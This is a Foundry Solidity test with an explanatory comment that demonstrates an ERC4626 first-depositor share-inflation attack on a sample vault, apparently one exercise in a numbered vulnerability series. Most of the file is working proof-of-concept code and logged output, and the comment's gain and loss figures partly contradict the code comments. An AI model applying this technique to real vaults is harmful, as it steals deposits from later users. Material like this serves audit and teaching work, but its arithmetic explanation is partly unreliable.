/*
Step 1: Initial Deposits and Setup
Token Allocation: Initially, tokens are distributed among various parties: deployer, first depositor, and victims. The first depositor starts with 1000 ether + 1.
First Depositor's Deposit: The first depositor approves and deposits 1 token into the vault.

Step 2: Manipulating Share Price
Inflation of the Vault's Assets: After the initial deposit, the first depositor sends 1000 ether directly to the vault. This doesn't change their shares but significantly inflates the vault's assets.
Price Per Share Before and After Inflation:
Before inflation: 1 share for the first depositor's 1 token (asset/share = 1).
After inflation: The assets in the vault dramatically increase, but the shares remain constant. The new asset/share calculation would show a drastic increase (asset/share > 1000000000000000000000), reflecting the higher asset base per existing share.

Step 3: Subsequent Deposits
Victim Deposits: Both victim1 and victim2 deposit 2000 ether each.
Shares Issued Post-Inflation:
Given the inflated asset base, the number of shares issued to each victim is much less per token than the first depositor received. The asset/share ratio used for these transactions results in each victim receiving far fewer shares compared to the assets they contributed.
After victim deposits, the asset/share ratios are:
Victim1: asset/share ≈ 1500000000000000000000
Victim2: asset/share ≈ 1666666666666666666667

Step 4: Withdrawals and Loss Realization
First Depositor Withdraws: Withdraws a portion of their shares:
The first depositor redeems shares and receives a significant amount of assets. asset/share at this time allows them to withdraw a disproportionate amount of assets (not directly stated but inferred from 2666666666666666666666 balance update).
Victims' Withdrawals:
Victim1 and Victim2 Withdraw: Both redeem shares and receive fewer assets than their initial deposit value, as the asset/share ratio means they receive less back per share compared to their input.
Asset/share is recalculated again after each transaction, affecting the next redeemer's withdrawal value.
Noted balances post-withdrawal:
Victim1: 1666666666666666666667
Victim2: 1666666666666666666667
The losses for victims (around 333 ether each) reflect the fewer assets received compared to the vault’s asset pool.

Conclusion: Outcome of the Attack
First Depositor's Gain: The first depositor effectively gains assets amounting to 666 ether, exploiting the inflated asset-to-share ratio.
Victims' Loss: Victim1 and Victim2 incur losses totaling approximately 333 ether each, a direct result of the asset dilution caused by the first depositor's manipulation.
This breakdown shows how the first depositor manipulates the vault's financial mechanics to their benefit, causing subsequent depositors to receive less than their fair share of the vault's assets.

 * By inflating the price per share, first depositor can rip off from victim1 and victiom2 due to 
 * rounding down error introduced by the implementation of ERC4626. 
 * The following log shows the finding: 
 * Logs:
  first depositor balance of TokenB 1
  asset/share:  1
  asset/share:  1000000000000000000001
  victim 1 balance of TokenB 1
  asset/share:  1500000000000000000000
  victim 2 balance of TokenB 1
  asset/share:  1666666666666666666667

 withdrawing....
  first depositor balance of PPswap 2666666666666666666666
  asset/share:  1666666666666666666667

 victim1 balance of PPswap 1666666666666666666667
  asset/share:  1666666666666666666667

 victim2 balance of PPswap 1666666666666666666667
  asset/share:  1
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {PPSwap} from "../..//src/003-first-depositor-attack/PPSwap.sol";
import {PPSVault} from "../../src/003-first-depositor-attack/PPSVault.sol";
import {PPSVaultFactory} from "../../src/003-first-depositor-attack/PPSVaultFactory.sol";

contract PPSVaultTest is Test {
    PPSwap ppswap;
    PPSVault ppsv;
    PPSVaultFactory ppsvFactory;
    address deployer = makeAddr("deployer");
    address firstDepositor = makeAddr("firstDepositor");
    address victim1 = makeAddr("victim1");
    address victim2 = makeAddr("victim2");

    function setUp() public {
        ppswap = new PPSwap();
        ppswap.transfer(deployer, 2000 ether);
        ppswap.transfer(firstDepositor, 2000 ether);
        ppswap.transfer(victim1, 2000 ether);
        ppswap.transfer(victim2, 2000 ether);

        vm.prank(deployer);
        ppsvFactory = new PPSVaultFactory();
        ppsv = ppsvFactory.deployPPSVault(address(ppswap));
    }

    function testFirstDepositorAttack() public {
        vm.startPrank(firstDepositor);
        ppswap.approve(address(ppsv), 1);
        ppsv.deposit(1, firstDepositor); // amount, receiver
        console2.log(
            "first depositor balance of ppsv",
            ppsv.balanceOf(firstDepositor)
        );
        console2.log("asset/share: ", ppsv.previewRedeem(1));

        // first depositor donate 1000 ether to inflate price per share
        ppswap.transfer(address(ppsv), 1000 ether);
        console2.log("asset/share: ", ppsv.previewRedeem(1));
        vm.stopPrank();

        // victim 1 deposit
        vm.startPrank(victim1);
        ppswap.approve(address(ppsv), 2000 ether);
        ppsv.deposit(2000 ether, victim1); // amount, receiver
        console2.log("victim 1 balance of ppsv", ppsv.balanceOf(victim1));
        console2.log("asset/share: ", ppsv.previewRedeem(1));
        vm.stopPrank();

        // victim 2 deposit
        vm.startPrank(victim2);
        ppswap.approve(address(ppsv), 2000 ether);
        ppsv.deposit(2000 ether, victim2); // amount, receiver
        console2.log("victim 2 balance of ppsv", ppsv.balanceOf(victim2));
        console2.log("asset/share: ", ppsv.previewRedeem(1));
        vm.stopPrank();

        console2.log("\n withdrawing....");

        // first depositor withdraw
        vm.startPrank(firstDepositor);
        ppsv.approve(address(ppsv), 1);
        ppsv.redeem(1, firstDepositor, firstDepositor); // amount, receiver, owner
        // he gained 666 ether below
        console2.log(
            "first depositor balance of PPswap",
            ppswap.balanceOf(firstDepositor)
        );
        console2.log("asset/share: ", ppsv.previewRedeem(1));
        vm.stopPrank();

        // victim1  withdraw
        vm.startPrank(victim1);
        ppsv.redeem(1, victim1, victim1); // amount, receiver, owner
        // he gained 1250 ether below
        console2.log("\n victim1 balance of PPswap", ppswap.balanceOf(victim1));
        // lost around 333 ether
        console2.log("asset/share: ", ppsv.previewRedeem(1));
        vm.stopPrank();

        // victim2  withdraw
        vm.startPrank(victim2);
        ppsv.redeem(1, victim2, victim2); // amount, receiver, owner
        // he gained 1250 ether below
        console2.log("\n victim2 balance of PPswap", ppswap.balanceOf(victim2));
        // lost around 333 ether
        console2.log("asset/share: ", ppsv.previewRedeem(1));
        vm.stopPrank();
    }
}
